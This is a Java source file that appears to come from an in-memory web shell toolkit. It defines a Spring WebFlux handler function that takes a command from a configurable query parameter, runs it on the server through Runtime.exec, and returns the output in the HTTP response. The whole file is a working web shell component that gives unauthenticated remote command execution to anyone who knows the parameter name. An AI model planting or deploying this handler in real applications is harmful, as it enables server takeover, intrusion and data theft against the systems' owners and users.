package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.web.reactive.function.server.HandlerFunction;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Optional;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandHandlerFunction implements HandlerFunction<ServerResponse> {
    public static String paramName;

    @Override
    public Mono<ServerResponse> handle(ServerRequest request) {
        Optional<String> cmdOptional = request.queryParam(paramName);
        if (!cmdOptional.isPresent()) {
            return Mono.empty();
        }
        System.out.println("hanlder function cmd " + cmdOptional.get());
        try {
            StringBuilder result = new StringBuilder();
            try {
                String cmd = cmdOptional.get();
                Process exec = Runtime.getRuntime().exec(cmd);
                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()))) {
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        result.append(line);
                        result.append(System.lineSeparator());
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return ServerResponse.ok().body(Mono.just(result.toString()), String.class);
        } catch (Exception ex) {
            ex.printStackTrace();
            return ServerResponse.ok().body(Mono.just(ex.getMessage()), String.class);
        }
    }
}
